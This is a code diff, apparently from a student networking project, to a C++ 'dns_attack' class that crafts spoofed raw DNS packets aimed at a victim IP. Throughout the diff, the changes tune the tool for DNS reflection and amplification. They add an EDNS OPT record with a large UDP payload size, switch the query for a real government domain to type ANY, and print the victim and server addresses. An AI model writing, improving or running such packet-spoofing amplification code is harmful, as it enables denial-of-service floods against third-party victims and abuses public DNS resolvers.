@@ -50,6 +50,14 @@ size_t dns_attack::setDNSPayload(const char* hostname, uint16_t dns_type, uint8_
 		uint16_t dnsclass; /* The QCLASS (1 = IN) */
 	};
 
+	struct dns_opt_rr {
+		uint8_t name;
+		uint16_t type;      //  OPT (41)
+		uint16_t opt_class; //  requestor's UDP payload size
+		uint32_t ttl;
+		uint16_t rdlen;
+	} __attribute__((packed));
+
 	size_t tot_len = 0;
 
 	/* Set up the DNS header */
@@ -59,6 +67,7 @@ size_t dns_attack::setDNSPayload(const char* hostname, uint16_t dns_type, uint8_
 	header->xid= htons(0x9A4D);    /* Randomly chosen ID; 9A4D: Jun-Hong 9A21: YojaHuang*/
 	header->flags = htons(0x0100); /* Q=0, RD=1 */
 	header->qdcount = htons(1);    /* Sending 1 question */
+	header->arcount = htons(1);    /* 1 additional record */
 
 	tot_len += sizeof(dns_header);
 
@@ -78,7 +87,7 @@ size_t dns_attack::setDNSPayload(const char* hostname, uint16_t dns_type, uint8_
 			count = 0;
 		}
 		else
-			count++;
+			++count;
 	}
 	*prev = count;
 
@@ -90,6 +99,14 @@ size_t dns_attack::setDNSPayload(const char* hostname, uint16_t dns_type, uint8_
 	question->dnsclass = htons(1); /* QCLASS 1=IN */
 	
 	tot_len += sizeof(dns_question);
+	
+	/* Set OPT(EDNS) */
+	dns_opt_rr* opt_rr = (dns_opt_rr*) (packet + tot_len);
+	memset(opt_rr, 0, sizeof(dns_opt_rr));
+	opt_rr->type = htons(41);
+	opt_rr->opt_class = htons(4095);
+	
+	tot_len += sizeof(dns_opt_rr);
 
 	return tot_len;
 }
@@ -109,10 +126,10 @@ void dns_attack::attack() {
 	
 	/* DNS payload */
 	uint8_t *packet = (uint8_t *) (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
-	size_t packetlen;
-	packetlen = setDNSPayload("cpsc.gov", 16, packet); // "cpsc.gov", "u.nu", "nycu.me"; /* QTYPE 1=A 255=ANY 16=TXT */
+	size_t packetlen = setDNSPayload("cpsc.gov", 255, packet); // "cpsc.gov", "u.nu", "nycu.me"; /* QTYPE 1=A 255=ANY 16=TXT */
 	
 	/* Debug */
+	std::cout << Victim_IP << ' ' << Source_Port << ' ' << Server_IP << std::endl;
 	std::cout << sizeof(struct iphdr) << ' ' << sizeof(struct udphdr) << ' ' << packetlen << std::endl;
 	
 	/* Setup ip, udp header */
